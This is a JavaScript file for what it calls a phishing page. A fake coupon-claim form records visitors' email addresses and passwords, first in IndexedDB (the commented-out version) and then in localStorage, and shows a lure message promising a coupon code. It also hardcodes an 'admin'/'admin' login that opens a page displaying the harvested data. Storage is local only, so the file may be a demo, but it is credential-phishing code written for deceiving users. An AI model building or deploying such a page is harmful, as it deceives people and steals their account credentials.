// const claimButton = document.getElementById('claim-button');
// const emailInput = document.getElementById('email-input');
// const passInput = document.getElementById('password-input');

// let db;

// function initDb() {
//     const request = indexedDB.open("PhishingDB", 1);

//     request.onerror = (event) => {
//         console.error("Database error:", event.target.error);
//     };

//     request.onsuccess = (event) => {
//         db = event.target.result;
//         console.log("Database initialized.");
//         showPhishingData();
//     };

//     request.onupgradeneeded = (event) => {
//         db = event.target.result;
//         const objectStore = db.createObjectStore("user_inputs", { keyPath: "id", autoIncrement: true });
//         objectStore.createIndex("email", "email", { unique: false });
//         objectStore.createIndex("password", "password", { unique: false });
//         console.log("Object store created.");
//     };
// }

// function handleDataSubmission() {
//     const email = emailInput.value;
//     const password = passInput.value;

//     const transaction = db.transaction(["user_inputs"], "readwrite");
//     const objectStore = transaction.objectStore("user_inputs");

//     const request = objectStore.add({ email, password });

//     request.onsuccess = () => {
//         alert('Thank you for claiming the coupon! You will receive your exclusive coupon code shortly on your email. You will be redirected to the product page after you press the \'ok\' button');
//         emailInput.value = '';
//         passInput.value = '';
//         showPhishingData();
//         history.back();
//     };

//     request.onerror = (event) => {
//         console.error("Add error:", event.target.error);
//     };
// }

// function showPhishingData() {
//     const transaction = db.transaction(["user_inputs"], "readonly");
//     const objectStore = transaction.objectStore("user_inputs");

//     const request = objectStore.getAll();

//     request.onsuccess = (event) => {
//         const data = event.target.result;
//         console.log('Phishing Data:', data);
//     };

//     request.onerror = (event) => {
//         console.error("Get all error:", event.target.error);
//     };
// }

// function storeDataLocally() {
//     const transaction = db.transaction(["user_inputs"], "readonly");
//     const objectStore = transaction.objectStore("user_inputs");

//     const request = objectStore.getAll();

//     request.onsuccess = (event) => {
//         const data = event.target.result;
//         localStorage.setItem('phishingData', JSON.stringify(data));
//         console.log('Phishing data stored locally.');
//     };

//     request.onerror = (event) => {
//         console.error("Get all error:", event.target.error);
//     };
// }


// document.addEventListener('DOMContentLoaded', () => {
//     initDb();
//     claimButton.addEventListener('click', handleDataSubmission);
// });

const claimButton = document.getElementById('claim-button');
const emailInput = document.getElementById('email-input');
const passInput = document.getElementById('password-input');

document.addEventListener('DOMContentLoaded', () => {
    claimButton.addEventListener('click', handleDataSubmission);
});

function handleDataSubmission() {
    const email = emailInput.value;
    const password = passInput.value;

    if (email === 'admin' && password === 'admin') {
        window.location.href = 'displaydata.html';
        return;
    }

    // Get existing data from localStorage
    let phishingData = JSON.parse(localStorage.getItem('phishingData')) || [];

    // Add new entry
    phishingData.push({ email, password });

    // Store updated data in localStorage
    localStorage.setItem('phishingData', JSON.stringify(phishingData));

    // Show an alert message
    alert('Thank you for claiming the coupon! You will receive your exclusive coupon code shortly on your email.');
    
    // Clear the input fields
    emailInput.value = '';
    passInput.value = '';
}
